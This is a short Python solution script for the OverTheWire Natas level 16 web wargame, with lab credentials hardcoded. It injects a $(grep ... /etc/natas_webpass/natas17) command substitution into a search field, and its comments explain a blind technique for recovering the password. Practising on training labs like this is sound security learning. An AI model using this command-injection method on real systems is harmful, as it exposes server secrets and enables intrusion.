#!/bin/python3

import requests
import re
import html.parser

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://%s.natas.labs.overthewire.org' % (username)

session = requests.Session()
data = { "needle" : 'contesting$(grep ' + '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw' + ' /etc/natas_webpass/natas17)' ,"submit":"Search" }
response = session.post(url + '',data = data,auth = (username,password) )

content = html.unescape(response.text)

if not (re.search("contesting",content)):
    print ("password found")
    print ("this script just confirms that the password works") 
    print ("bruteforcegrep16.py will run through how the password was retrieved")
else:
    print ("password not found")
    print ("check bruteforcegrep16.py for issues")
#print (re.findall('Successful login! The password for natas15 is (.*)<br>',content)[0]) 

#another one passing user input into grep
#this time not allowed to use [;|&`'"]
# we can still use {} # () $
#command looks like grep -i "[key]" dictionary.txt
#because the user input is in the middle of quotes and 
#any user input that includes qoutes will be filtered
#we cant simply cat out the password file for this one

#what we can do is, using a word that we know is in the dictionary
#we can generate a query that will append the given word
#with the result of a command of our choosing 
#therefore if the command returns a result the systems grep command 
#wont return a result this way we can cycle through 
#the potential passwords in a similar fashion to the last one
#the word we choose must not be a subset of any other word in the dictionary 


